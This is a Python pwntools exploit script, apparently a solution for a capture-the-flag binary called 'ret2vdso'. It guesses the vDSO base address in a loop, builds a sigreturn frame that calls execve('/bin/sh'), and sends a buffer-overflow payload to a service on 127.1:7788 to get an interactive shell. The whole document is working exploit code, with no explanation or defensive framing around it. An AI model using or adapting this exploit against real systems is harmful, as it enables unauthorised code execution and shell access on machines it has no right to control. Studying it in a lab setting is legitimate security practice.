from pwn import *
context(os="linux", arch="i386")
context.log_level="debug"

g_elf = ELF("ret2vdso")
vdso = ELF("./vdso_x32.so")

vdso_rg = range(0xf7ec8000, 0xf7fc7000, 0x1000)



while True:
    try:
        io = remote("127.1", 7788)
        # io = process("./ret2vdso")
        vdso.address = random.choice(vdso_rg)
        # base = int(input("Please input the vdso base in hex:"), 16)
        # vdso.address = base
        log.info("guess vdso@%#x" % vdso.address)
        addr_binsh = g_elf.symbols["buf"]
        sf = SigreturnFrame(arch="i386", kernel="amd64")
        sf.eax = constants.SYS_execve
        sf.ebx = addr_binsh
        sf.ecx = 0
        sf.edx = 0 
        sf.eip = 0x557 + vdso.address

        # gdb: info reg, to obtain these values
        #  the segment selector's value is architecture and 
        #  kernel relative. if we've set the arch and kernel
        #  in context, the SigreturnFrame will init with proper
        #  value.
        # sf.cs = 0x23
        # sf.ss = 0x2b
        # sf.ds = 0x2b
        # sf.es = 0x2b

        addr_sigret = 0x571 + vdso.address
        payload = flat([
            "/bin/sh\0".ljust(0x84, 'A'),
            addr_sigret,
            sf
        ])

        io.send(payload)
        io.interactive()
    except Exception as e:
        io.close()